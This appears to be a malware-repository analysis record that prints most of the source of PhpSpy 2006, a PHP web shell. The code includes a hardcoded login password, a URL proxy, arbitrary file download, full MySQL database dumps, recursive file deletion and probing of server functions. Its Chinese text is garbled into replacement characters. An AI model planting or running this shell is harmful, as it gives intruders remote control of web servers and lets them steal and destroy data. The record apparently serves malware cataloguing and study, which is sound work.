array(\"\u0479\ufffd\ufffd\ufffd\u013c\ufffd\u05a7\ufffd\ufffd(Zlib)\",getfun(\"gzclose\")),\n\t\t\t36 => array(\"XML\ufffd\ufffd\ufffd\ufffd\",getfun(\"xml_set_object\")),\n\t\t\t37 => array(\"FTP\",getfun(\"ftp_login\")),\n\t\t\t38 => array(\"ODBC\ufffd\ufffd\ufffd\u077f\ufffd\ufffd\ufffd\ufffd\ufffd\",getfun(\"odbc_close\")),\n\t\t\t39 => array(\"Session\u05a7\ufffd\ufffd\",getfun(\"session_start\")),\n\t\t\t40 => array(\"Socket\u05a7\ufffd\ufffd\",getfun(\"fsockopen\")),\n\t\t); \n\n\t$tb->tableheader();\n\techo \"<form action=\\\"?action=phpenv\\\" method=\\\"POST\\\">\\n\";\n\t$tb->tdbody('<b>\ufffd\u9ff4PHP\ufffd\ufffd\ufffd\u00f2\ufffd\ufffd\ufffd\u05f4\ufffd\ufffd</b>','left','1','30','style=\"padding-left: 5px;\"');\n\t$tb->tdbody('\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00f2\ufffd\ufffd\ufffd(\ufffd\ufffd:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','\ufffd\u9ff4','','submit'),'left','2','30','style=\"padding-left: 5px;\"');\n\t$tb->makehidden('do','viewphpvar');\n\techo \"</form>\\n\";\n\t$hp = array(0=> '\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd', 1=> 'PHP\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd', 2=> '\ufffd\ufffd\ufffd\u05a7\ufffd\ufffd\u05f4\ufffd\ufffd');\n\tfor ($a=0;$a<3;$a++) {\n\t\t$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style=\"padding-left: 5px;\"');\n?>\n  <tr class=\"secondalt\">\n    <td>\n      <table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n<?php\n\t\tif ($a==0) {\n\t\t\tfor($i=0;$i<=12;$i++) {\n\t\t\t\techo \"<tr><td width=40% style=\\\"padding-left: 5px;\\\">\".$info[$i][0].\"</td><td>\".$info[$i][1].\"</td></tr>\\n\";\n\t\t\t}\n\t\t} elseif ($a == 1) {\n\t\t\tfor ($i=13;$i<=24;$i++) {\n\t\t\t\techo \"<tr><td width=40% style=\\\"padding-left: 5px;\\\">\".$info[$i][0].\"</td><td>\".$info[$i][1].\"</td></tr>\\n\";\n\t\t\t}\n\t\t} elseif ($a == 2) {\n\t\t\tfor ($i=25;$i<=40;$i++) {\n\t\t\t\techo \"<tr><td width=40% style=\\\"padding-left: 5px;\\\">\".$info[$i][0].\"</td><td>\".$info[$i][1].\"</td></tr>\\n\";\n\t\t\t}\n\t\t}\n?>\n      </table>\n    </td>\n  </tr>\n<?php\n\t}//for\necho \"</table>\";\n}//end phpenv\n?>\n<hr width=\"775\" noshade>\n<table width=\"775\" border=\"0\" cellpadding=\"0\">\n  <tr>\n    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>\n    <td align=\"right\"><?php\n\tdebuginfo();\n\tob_end_flush();\t\n\t?></td>\n  </tr>\n</table>\n</center>\n</body>\n</html>\n\n<?php\n\n/*======================================================\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\n======================================================*/\n\n\t// \ufffd\ufffd\u00bd\ufffd\ufffd\ufffd\n\tfunction loginpage() {\n?>\n<style type=\"text/css\">\ninput {font-family: \"Verdana\";font-size: \"11px\";BACKGROUND-COLOR: \"#FFFFFF\";height: \"18px\";border: \"1px solid #666666\";}\n</style>\n<form method=\"POST\" action=\"\">\n<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\">\n<input type=\"hidden\" name=\"do\" value=\"login\">\n<input type=\"submit\" value=\"Login\">\n</form>\n<?php\n\t\texit;\n\t}//end loginpage()\n\n\t// \u04b3\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03e2\n\tfunction debuginfo() {\n\t\tglobal $starttime;\n\t\t$mtime = explode(' ', microtime());\n\t\t$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);\n\t\techo \"Processed in $totaltime second(s)\";\n\t}\n\n\t// \u0225\ufffd\ufffd\u05ea\ufffd\ufffd\ufffd\u05b7\ufffd\n\tfunction stripslashes_array(&$array) {\n\t\twhile(list($key,$var) = each($array)) {\n\t\t\tif ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == \"$key\")) {\n\t\t\t\tif (is_string($var)) {\n\t\t\t\t\t$array[$key] = stripslashes($var);\n\t\t\t\t}\n\t\t\t\tif (is_array($var))  {\n\t\t\t\t\t$array[$key] = stripslashes_array($var);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn $array;\n\t}\n\n\t// \u027e\ufffd\ufffd\u013f\u00bc\n\tfunction deltree($deldir) {\n\t\t$mydir=@dir($deldir);\t\n\t\twhile($file=$mydir->read())\t{ \t\t\n\t\t\tif((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\")) { \n\t\t\t\t@chmod(\"$deldir/$file\",0777);\n\t\t\t\tdeltree(\"$deldir/$file\"); \n\t\t\t}\n\t\t\tif (is_file(\"$deldir/$file\")) {\n\t\t\t\t@chmod(\"$deldir/$file\",0777);\n\t\t\t\t@unlink(\"$deldir/$file\");\n\t\t\t}\n\t\t} \n\t\t$mydir->close(); \n\t\t@chmod(\"$deldir\",0777);\n\t\treturn (@rmdir($deldir)) ? 1 : 0;\n\t} \n\n\t// \ufffd\u0436\u03f6\ufffd\u0434\ufffd\ufffd\ufffd\n\tfunction dir_writeable($dir) {\n\t\tif (!is_dir($dir)) {\n\t\t\t@mkdir($dir, 0777);\n\t\t}\n\t\tif(is_dir($dir)) {\n\t\t\tif ($fp = @fopen(\"$dir/test.txt\", 'w')) {\n\t\t\t\t@fclose($fp);\n\t\t\t\t@unlink(\"$dir/test.txt\");\n\t\t\t\t$writeable = 1;\n\t\t\t} else {\n\t\t\t\t$writeable = 0;\n\t\t\t}\n\t\t}\n\t\treturn $writeable;\n\t}\n\n\t// \ufffd\ufffd\ufffd\ufffd\ufffd\u043c\ufffd\u0131\ufffd\ufffd\ufffd\u026b\ufffd\u6efb\n\tfunction getrowbg() {\n\t\tglobal $bgcounter;\n\t\tif ($bgcounter++%2==0) {\n\t\t\treturn \"firstalt\";\n\t\t} else {\n\t\t\treturn \"secondalt\";\n\t\t}\n\t}\n\n\t// \ufffd\ufffd\u0221\ufffd\ufffd\u01f0\ufffd\ufffd\ufffd\u013c\ufffd\u03f5\u0373\u00b7\ufffd\ufffd\n\tfunction getPath($mainpath, $relativepath) {\n\t\tglobal $dir;\n\t\t$mainpath_info           = explode('/', $mainpath);\n\t\t$relativepath_info       = explode('/', $relativepath);\n\t\t$relativepath_info_count = count($relativepath_info);\n\t\tfor ($i=0; $i<$relativepath_info_count; $i++) {\n\t\t\tif ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;\n\t\t\tif ($relativepath_info[$i] == '..') {\n\t\t\t\t$mainpath_info_count = count($mainpath_info);\n\t\t\t\tunset($mainpath_info[$mainpath_info_count-1]);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];\n\t\t} //end for\n\t\treturn implode('/', $mainpath_info);\n\t}\n\n\t// \ufffd\ufffd\ufffdPHP\ufffd\ufffd\ufffd\u00f2\ufffd\ufffd\ufffd\n\tfunction getphpcfg($varname) {\n\t\tswitch($result = get_cfg_var($varname)) {\n\t\t\tcase 0:\n\t\t\treturn \"No\";\n\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\treturn \"Yes\";\n\t\t\tbreak;\n\t\t\tdefault:\n\t\t\treturn $result;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t// \ufffd\ufffd\u9eaf\ufffd\ufffd\ufffd\ufffd\ufffd\n\tfunction getfun($funName) {\n\t\treturn (false !== function_exists($funName)) ? \"Yes\" : \"No\";\n\t}\n\n\t// \u0479\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\n\tclass PHPZip{\n\tvar $out='';\n\t\tfunction PHPZip($dir)\t{\n    \t\tif (@function_exists('gzcompress'))\t{\n\t\t\t\t$curdir = getcwd();\n\t\t\t\tif (is_array($dir)) $filelist = $dir;\n\t\t        else{\n\t\t\t        $filelist=$this -> GetFileList($dir);//\ufffd\u013c\ufffd\ufffd\u0431\ufffd\n\t\t\t\t    foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);\n\t            }\n\t\t        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);\n\t\t\t\telse chdir($curdir);\n\t\t\t\tif (count($filelist)>0){\n\t\t\t\t\tforeach($filelist as $filename){\n\t\t\t\t\t\tif (is_file($filename)){\n\t\t\t\t\t\t\t$fd = fopen ($filename, \"r\");\n\t\t\t\t\t\t\t$content = @fread ($fd, filesize ($filename));\n\t\t\t\t\t\t\tfclose ($fd);\n\t\t\t\t\t\t    if (is_array($dir)) $filename = basename($filename);\n\t\t\t\t\t\t\t$this -> addFile($content, $filename);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$this->out = $this -> file();\n\t\t\t\t\tchdir($curdir);\n\t\t\t\t}\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\telse return 0;\n\t\t}\n\n\t\t// \ufffd\ufffd\ufffd\u05b8\ufffd\ufffd\u013f\u00bc\ufffd\u013c\ufffd\ufffd\u0431\ufffd\n\t\tfunction GetFileList($dir){\n\t\t\tstatic $a;\n\t\t\tif (is_dir($dir)) {\n\t\t\t\tif ($dh = opendir($dir)) {\n\t\t\t   \t\twhile (($file = readdir($dh)) !== false) {\n\t\t\t\t\t\tif($file!='.' && $file!='..'){\n            \t\t\t\t$f=$dir .'/'. $file;\n            \t\t\t\tif(is_dir($f)) $this->GetFileList($f);\n\t\t\t\t\t\t\t$a[]=$f;\n\t        \t\t\t}\n\t\t\t\t\t}\n     \t\t\t\tclosedir($dh);\n    \t\t\t}\n\t\t\t}\n\t\t\treturn $a;\n\t\t}\n\n\t\tvar $datasec      = array();\n\t    var $ctrl_dir     = array();\n\t\tvar $eof_ctrl_dir = \"\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\";\n\t    var $old_offset   = 0;\n\n\t\tfunction unix2DosTime($unixtime = 0) {\n\t        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);\n\t\t    if ($timearray['year'] < 1980) {\n\t\t\t\t$timearray['year']    = 1980;\n        \t\t$timearray['mon']     = 1;\n\t        \t$timearray['mday']    = 1;\n\t\t    \t$timearray['hours']   = 0;\n\t\t\t\t$timearray['minutes'] = 0;\n        \t\t$timearray['seconds'] = 0;\n\t        } // end if\n\t\t    return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |\n\t\t\t        ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);\n\t    }\n\n\t\tfunction addFile($data, $name, $time = 0) {\n\t        $name     = str_replace('\\\\', '/', $name);\n\n\t\t    $dtime    = dechex($this->unix2DosTime($time));\n\t        $hexdtime = '\\x' . $dtime[6] . $dtime[7]\n\t\t              . '\\x' . $dtime[4] . $dtime[5]\n\t\t\t          . '\\x' . $dtime[2] . $dtime[3]\n\t\t\t\t      . '\\x' . $dtime[0] . $dtime[1];\n\t        eval('$hexdtime = \"' . $hexdtime . '\";');\n\t\t    $fr   = \"\\x50\\x4b\\x03\\x04\";\n\t\t\t$fr   .= \"\\x14\\x00\";\n\t        $fr   .= \"\\x00\\x00\";\n\t\t    $fr   .= \"\\x08\\x00\";\n\t\t\t$fr   .= $hexdtime;\n\n\t        $unc_len = strlen($data);\n\t\t    $crc     = crc32($data);\n\t\t\t$zdata   = gzcompress($data);\n\t        $c_len   = strlen($zdata);\n\t\t    $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);\n\t\t\t$fr      .= pack('V', $crc);\n\t        $fr      .= pack('V', $c_len);\n\t\t    $fr      .= pack('V', $unc_len);\n\t\t\t$fr      .= pack('v', strlen($name));\n\t        $fr      .= pack('v', 0);\n\t\t    $fr      .= $name;\n\n\t\t\t$fr .= $zdata;\n\n\t        $fr .= pack('V', $crc);\n\t\t    $fr .= pack('V', $c_len);\n\t\t\t$fr .= pack('V', $unc_len);\n\n\t        $this -> datasec[] = $fr;\n\t\t    $new_offset        = strlen(implode('', $this->datasec));\n\n\t\t\t$cdrec = \"\\x50\\x4b\\x01\\x02\";\n\t        $cdrec .= \"\\x00\\x00\";\n\t\t    $cdrec .= \"\\x14\\x00\";\n\t\t\t$cdrec .= \"\\x00\\x00\";\n\t        $cdrec .= \"\\x08\\x00\";\n\t\t    $cdrec .= $hexdtime;\n\t\t\t$cdrec .= pack('V', $crc);\n\t        $cdrec .= pack('V', $c_len);\n\t\t    $cdrec .= pack('V', $unc_len);\n\t\t\t$cdrec .= pack('v', strlen($name) );\n\t        $cdrec .= pack('v', 0 );\n\t\t    $cdrec .= pack('v', 0 );\n\t\t\t$cdrec .= pack('v', 0 );\n\t        $cdrec .= pack('v', 0 );\n\t\t    $cdrec .= pack('V', 32 );\n\t\t\t$cdrec .= pack('V', $this -> old_offset );\n\t        $this -> old_offset = $new_offset;\n\t\t    $cdrec .= $name;\n\n\t\t\t$this -> ctrl_dir[] = $cdrec;\n\t    }\n\n\t\tfunction file() {\n\t\t\t$data    = implode('', $this -> datasec);\n\t        $ctrldir = implode('', $this -> ctrl_dir);\n\t\t    return\n\t\t\t    $data .\n\t\t\t\t$ctrldir .\n\t            $this -> eof_ctrl_dir .\n\t\t        pack('v', sizeof($this -> ctrl_dir)) .\n\t\t\t    pack('v', sizeof($this -> ctrl_dir)) .\n\t\t\t\tpack('V', strlen($ctrldir)) .\n\t            pack('V', strlen($data)) .\n\t\t        \"\\x00\\x00\";\n\t    }\n\t}\n\n\t// \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u077f\ufffd\n\tfunction sqldumptable($table, $fp=0) {\n\t\t$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";\n\t\t$tabledump .= \"CREATE TABLE $table (\\n\";\n\n\t\t$firstfield=1;\n\n\t\t$fields = mysql_query(\"SHOW FIELDS FROM $table\");\n\t\twhile ($field = mysql_fetch_array($fields)) {\n\t\t\tif (!$firstfield) {\n\t\t\t\t$tabledump .= \",\\n\";\n\t\t\t} else {\n\t\t\t\t$firstfield=0;\n\t\t\t}\n\t\t\t$tabledump .= \"   $field[Field] $field[Type]\";\n\t\t\tif (!empty($field[\"Default\"])) {\n\t\t\t\t$tabledump .= \" DEFAULT '$field[Default]'\";\n\t\t\t}\n\t\t\tif ($field['Null'] != \"YES\") {\n\t\t\t\t$tabledump .= \" NOT NULL\";\n\t\t\t}\n\t\t\tif ($field['Extra'] != \"\") {\n\t\t\t\t$tabledump .= \" $field[Extra]\";\n\t\t\t}\n\t\t}\n\t\tmysql_free_result($fields);\n\t\n\t\t$keys = mysql_query(\"SHOW KEYS FROM $table\");\n\t\twhile ($key = mysql_fetch_array($keys)) {\n\t\t\t$kname=$key['Key_name'];\n\t\t\tif ($kname != \"PRIMARY\" and $key['Non_unique'] == 0) {\n\t\t\t\t$kname=\"UNIQUE|$kname\";\n\t\t\t}\n\t\t\tif(!is_array($index[$kname])) {\n\t\t\t\t$index[$kname] = array();\n\t\t\t}\n\t\t\t$index[$kname][] = $key['Column_name'];\n\t\t}\n\t\tmysql_free_result($keys);\n\n\t\twhile(list($kname, $columns) = @each($index)) {\n\t\t\t$tabledump .= \",\\n\";\n\t\t\t$colnames=implode($columns,\",\");\n\n\t\t\tif ($kname == \"PRIMARY\") {\n\t\t\t\t$tabledump .= \"   PRIMARY KEY ($colnames)\";\n\t\t\t} else {\n\t\t\t\tif (substr($kname,0,6) == \"UNIQUE\") {\n\t\t\t\t\t$kname=substr($kname,7);\n\t\t\t\t}\n\t\t\t\t$tabledump .= \"   KEY $kname ($colnames)\";\n\t\t\t}\n\t\t}\n\n\t\t$tabledump .= \"\\n);\\n\\n\";\n\t\tif ($fp) {\n\t\t\tfwrite($fp,$tabledump);\n\t\t} else {\n\t\t\techo $tabledump;\n\t\t}\n\n\t\t$rows = mysql_query(\"SELECT * FROM $table\");\n\t\t$numfields = mysql_num_fields($rows);\n\t\twhile ($row = mysql_fetch_array($rows)) {\n\t\t\t$tabledump = \"INSERT INTO $table VALUES(\";\n\n\t\t\t$fieldcounter=-1;\n\t\t\t$firstfield=1;\n\t\t\twhile (++$fieldcounter<$numfields) {\n\t\t\t\tif (!$firstfield) {\n\t\t\t\t\t$tabledump.=\", \";\n\t\t\t\t} else {\n\t\t\t\t\t$firstfield=0;\n\t\t\t\t}\n\n\t\t\t\tif (!isset($row[$fieldcounter])) {\n\t\t\t\t\t$tabledump .= \"NULL\";\n\t\t\t\t} else {\n\t\t\t\t\t$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t$tabledump .= \");\\n\";\n\n\t\t\tif ($fp) {\n\t\t\t\tfwrite($fp,$tabledump);\n\t\t\t} else {\n\t\t\t\techo $tabledump;\n\t\t\t}\n\t\t}\n\t\tmysql_free_result($rows);\n\t}\n\n\tclass FORMS {\n\t\tfunction tableheader() {\n\t\t\techo \"<table width=\\\"775\\\" border=\\\"0\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" bgcolor=\\\"#ffffff\\\">\\n\";\n\t\t}\n\n\t\tfunction headerform($arg=array()) {\n\t\t\tglobal $dir;\n\t\t\tif ($arg[enctype]){\n\t\t\t\t$enctype=\"enctype=\\\"$arg[enctype]\\\"\";\n\t\t\t} else {\n\t\t\t\t$enctype=\"\";\n\t\t\t}\n\t\t\tif (!isset($arg[method])) {\n\t\t\t\t$arg[method] = \"POST\";\n\t\t\t}\n\t\t\tif (!isset($arg[action])) {\n\t\t\t\t$arg[action] = '';\n\t\t\t}\n\t\t\techo \"  <form action=\\\"\".$arg[action].\"\\\" method=\\\"\".$arg[method].\"\\\" $enctype>\\n\";\n\t\t\techo \"  <tr>\\n\";\n\t\t\techo \"    <td>\".$arg[content].\"</td>\\n\";\n\t\t\techo \"  </tr>\\n\";\n\t\t\techo \"  </form>\\n\";\n\t\t}\n\n\t\tfunction tdheader($title) {\n\t\t\tglobal $dir;\n\t\t\techo \"  <tr class=\\\"firstalt\\\">\\n\";\n\t\t\techo \"\t<td align=\\\"center\\\"><b>\".$title.\" [<a href=\\\"?dir=\".urlencode($dir).\"\\\">\ufffd\ufffd\ufffd\ufffd</a>]</b></td>\\n\";\n\t\t\techo \"  </tr>\\n\";\n\t\t}\n\n\t\tfunction tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {\n\t\t\tif ($bgcolor=='2') {\n\t\t\t\t$css=\"secondalt\";\n\t\t\t} elseif ($bgcolor=='1') {\n\t\t\t\t$css=\"firstalt\";\n\t\t\t} else {\n\t\t\t\t$css=$bgcolor;\n\t\t\t}\n\t\t\t$height = empty($height) ? \"\" : \" height=\".$height;\n\t\t\t$colspan = empty($colspan) ? \"\" : \" colspan=\".$colspan;\n\t\t\techo \"  <tr class=\\\"\".$css.\"\\\">\\n\";\n\t\t\techo \"\t<td align=\\\"\".$align.\"\\\"\".$height.\" \".$colspan.\" \".$extra.\">\".$content.\"</td>\\n\";\n\t\t\techo \"  </tr>\\n\";\n\t\t}\n\n\t\tfunction tablefooter() {\n\t\t\techo \"</table>\\n\";\n\t\t}\n\n\t\tfunction formheader($action='',$title,$target='') {\n\t\t\tglobal $dir;\n\t\t\t$target = empty($target) ? \"\" : \" target=\\\"\".$target.\"\\\"\";\n\t\t\techo \" <form action=\\\"$action\\\" method=\\\"POST\\\"\".$target.\">\\n\";\n\t\t\techo \"  <tr class=\\\"firstalt\\\">\\n\";\n\t\t\techo \"\t<td align=\\\"center\\\"><b>\".$title.\" [<a href=\\\"?dir=\".urlencode($dir).\"\\\">\ufffd\ufffd\ufffd\ufffd</a>]</b></td>\\n\";\n\t\t\techo \"  </tr>\\n\";\n\t\t}\n\n\t\tfunction makehidden($name,$value=''){\n\t\t\techo \"<input type=\\\"hidden\\\" name=\\\"$name\\\" value=\\\"$value\\\">\\n\";\n\t\t}\n\n\t\tfunction makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){\n\t\t\t$css = ($css == 'input') ? \" class=\\\"input\\\"\" : \"\";\n\t\t\t$input = \"<input name=\\\"$name\\\" value=\\\"$value\\\" type=\\\"$type\\\" \".$css.\" size=\\\"$size\\\" $extra>\\n\";\n\t\t\treturn $input;\n\t\t}\n\n\t\tfunction maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){\n\t\t\t$textarea = \"<textarea name=\\\"\".$name.\"\\\" cols=\\\"\".$cols.\"\\\" rows=\\\"\".$rows.\"\\\" \".$extra.\">\".$content.\"</textarea>\\n\";\n\t\t\treturn $textarea;\n\t\t}\n\n\t\tfunction formfooter($over='',$height=''){\n\t\t\t$height = empty($height) ? \"\" : \" height=\\\"\".$height.\"\\\"\";\n\t\t\techo \"  <tr class=\\\"secondalt\\\">\\n\";\n\t\t\techo \"\t<td align=\\\"center\\\"\".$height.\"><input class=\\\"input\\\" type=\\\"submit\\\" value=\\\"\u0237\ufffd\ufffd\\\"></td>\\n\";\n\t\t\techo \"  </tr>\\n\";\n\t\t\techo \" </form>\\n\";\n\t\t\techo $end = empty($over) ? \"\" : \"</table>\\n\";\n\t\t}\n\n\t\tfunction makeselect($arg = array()){\n\t\t\tif ($arg[multiple]==1) {\n\t\t\t\t$multiple = \" multiple\";\n\t\t\t\tif ($arg[size]>0) {\n\t\t\t\t\t$size = \"size=$arg[size]\";\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ($arg[css]==0) {\n\t\t\t\t$css = \"class=\\\"input\\\"\";\n\t\t\t}\n\t\t\t$select = \"<select $css name=\\\"$arg[name]\\\"$multiple $size>\\n\";\n\t\t\t\tif (is_array($arg[option])) {\n\t\t\t\t\tforeach ($arg[option] AS $key=>$value) {\n\t\t\t\t\t\tif (!is_array($arg[selected])) {\n\t\t\t\t\t\t\tif ($arg[selected]==$key) {\n\t\t\t\t\t\t\t\t$select .= \"<option value=\\\"$key\\\" selected>$value</option>\\n\";\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t$select .= \"<option value=\\\"$key\\\">$value</option>\\n\";\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t} elseif (is_array($arg[selected])) {\n\t\t\t\t\t\t\tif ($arg[selected][$key]==1) {\n\t\t\t\t\t\t\t\t$select .= \"<option value=\\\"$key\\\" selected>$value</option>\\n\";\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t$select .= \"<option value=\\\"$key\\\">$value</option>\\n\";\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t$select .= \"</select>\\n\";\n\t\t\treturn $select;\n\t\t}\n\t}\n?>"
    },
    "filename": "VirusShare_2f8359a39ca174fdffd15d1ff60fcb31",
    "filesize": 48166,
    "filetype": "PHP script, ISO-8859 text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "2f8359a39ca174fdffd15d1ff60fcb31",
        "sha1": "84adfe280b1928e588a3f58a574efc6990174635",
        "sha256": "049f1c91f0d2937e20f3c6b6d3b86ba6eafc0fa7c7752115b6f021ca2e303d6a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?php",
            "+--------------------------------------------------------------------------+",
            "| str_replace(\".\", \"\", \"P.h.p.S.p.y\") Version:2006                         |",
            "| Codz by Angel                                                            |",
            "| (c) 2004 Security Angel Team                                             |",
            "| http://www.4ngel.net                                                     |",
            "| ======================================================================== |",
            "| Team:  http://www.4ngel.net                                              |",
            "|        http://www.bugkidz.org                                            |",
            "| Email: 4ngel@21cn.com                                                    |",
            "| Date:  Mar 21st 2005                                                     |",
            "| Thx All The Fantasy of Wickedness's members                              |",
            "| Thx FireFox (http://www.molyx.com)                                       |",
            "+--------------------------------------------------------------------------+",
            "error_reporting(7);",
            "ob_start();",
            "$mtime = explode(' ', microtime());",
            "$starttime = $mtime[1] + $mtime[0];",
            "/*=====================  =====================*/",
            "// \u01f7\u04aa\u05a4,1\u03aa\u04aa\u05a4,\u03aa\u05b1\u04fd.\u0461\u0427",
            "$admin['check'] = \"1\";",
            "// \u04aa\u05a4,\u07b8\u0135",
            "$admin['pass']  = \"hutuxia\";",
            "/*===================== ",
            " =====================*/",
            "//  register_globals = off \u013b",
            "$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');",
            "if ($onoff != 1) {",
            "\t@extract($_POST, EXTR_SKIP);",
            "\t@extract($_GET, EXTR_SKIP);",
            "$self = $_SERVER['PHP_SELF'];",
            "$dis_func = get_cfg_var(\"disable_functions\");",
            "/*===================== \u05a4 =====================*/",
            "if($admin['check'] == \"1\") {",
            "\tif ($_GET['action'] == \"logout\") {",
            "\t\tsetcookie (\"adminpass\", \"\");",
            "\t\techo \"<meta http-equiv=\\\"refresh\\\" content=\\\"3;URL=\".$self.\"\\\">\";",
            "\t\techo \"<span style=\\\"font-size: 12px; font-family: Verdana\\\">\u05e2\u0279......<p><a href=\\\"\".$self.\"\\\">\u0536\u02f3\uda96\udd7b\u02f3 &gt;&gt;&gt;</a></span>\";",
            "\t\texit;",
            "\tif ($_POST['do'] == 'login') {",
            "\t\t$thepass=trim($_POST['adminpass']);",
            "\t\tif ($admin['pass'] == $thepass) {",
            "\t\t\tsetcookie (\"adminpass\",$thepass,time()+(1*24*3600));",
            "\t\t\techo \"<meta http-equiv=\\\"refresh\\\" content=\\\"3;URL=\".$self.\"\\\">\";",
            "\t\t\techo \"<span style=\\\"font-size: 12px; font-family: Verdana\\\">",
            "\u0279......<p><a href=\\\"\".$self.\"\\\">\u0536\u05ea\uda96\udd7b &gt;&gt;&gt;</a></span>\";",
            "\t\t\texit;",
            "\tif (isset($_COOKIE['adminpass'])) {",
            "\t\tif ($_COOKIE['adminpass'] != $admin['pass']) {",
            "\t\t\tloginpage();",
            "\t} else {",
            "\t\tloginpage();",
            "/*===================== \u05a4 =====================*/",
            "// \u0436 magic_quotes_gpc \u05f4\u032c",
            "if (get_magic_quotes_gpc()) {",
            "    $_GET = stripslashes_array($_GET);",
            "\t$_POST = stripslashes_array($_POST);",
            "// \u9ff4PHPINFO",
            "if ($_GET['action'] == \"phpinfo\") {",
            "\techo $phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? phpinfo() : \"phpinfo() \u0471,\u9ff4&lt;PHP&gt;\";",
            "\texit;",
            "// \u07f4",
            "if (isset($_POST['url'])) {",
            "\t$proxycontents = @file_get_contents($_POST['url']);",
            "\techo ($proxycontents) ? $proxycontents : \"<body bgcolor=\\\"#F5F5F5\\\" style=\\\"font-size: 12px;\\\"><center><br><p><b>\u0221 URL \u02a7</b></p></center></body>\";",
            "\texit;",
            "// \u013c",
            "if (!empty($downfile)) {",
            "\tif (!@file_exists($downfile)) {",
            "\t\techo \"<script>alert('\u04aa",
            "\u013c!')</script>\";",
            "\t} else {",
            "\t\t$filename = basename($downfile);",
            "\t\t$filename_info = explode('.', $filename);",
            "\t\t$fileext = $filename_info[count($filename_info)-1];",
            "\t\theader('Content-type: application/x-'.$fileext);",
            "\t\theader('Content-Disposition: attachment; filename='.$filename);",
            "\t\theader('Content-Description: PHP Generated Data');",
            "\t\theader('Content-Length: '.filesize($downfile));",
            "\t\t@readfile($downfile);",
            "\t\texit;",
            "// \u05b1\u0631\u077f",
            "if ($_POST['backuptype'] == 'download') {",
            "\t@mysql_connect($servername,$dbusername,$dbpassword) or die(\"\u077f\u02a7\");",
            "\t@mysql_select_db($dbname) or die(\"\u0461\u077f\u02a7\");\t",
            "\t$table = array_flip($_POST['table']);",
            "\t$result = mysql_query(\"SHOW tables\");",
            "\techo ($result) ? NULL : \": \".mysql_error();",
            "\t$filename = basename($_SERVER['HTTP_HOST'].\"_MySQL.sql\");",
            "\theader('Content-type: application/unknown');",
            "\theader('Content-Disposition: attachment; filename='.$filename);",
            "\t$mysqldata = '';",
            "\twhile ($currow = mysql_fetch_array($result)) {",
            "\t\tif (isset($table[$currow[0]])) {",
            "\t\t\t$mysqldata.= sqldumptable($currow[0]);",
            "\t\t\t$mysqldata.= $mysqldata.\"\\r\\n\";",
            "\tmysql_close();",
            "\texit;",
            "// \u013f",
            "$pathname=str_replace('\\\\','/',dirname(__FILE__)); ",
            "// \u0221\u01f0",
            "if (!isset($dir) or empty($dir)) {",
            "\t$dir = \".\";",
            "\t$nowpath = getPath($pathname, $dir);",
            "} else {",
            "\t$dir=$_GET['dir'];",
            "\t$nowpath = getPath($pathname, $dir);",
            "// \u0436\u03f6\u0434",
            "$dir_writeable = (dir_writeable($nowpath)) ? \"\u0434\" : \"\u0434\";",
            "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";",
            "$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? \" | <a href=\\\"?action=reg\\\">\u05e2</a>\" : \"\";",
            "$tb = new FORMS;",
            "<html>",
            "<head>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">",
            "<title>PhpSpy Ver 2006</title>",
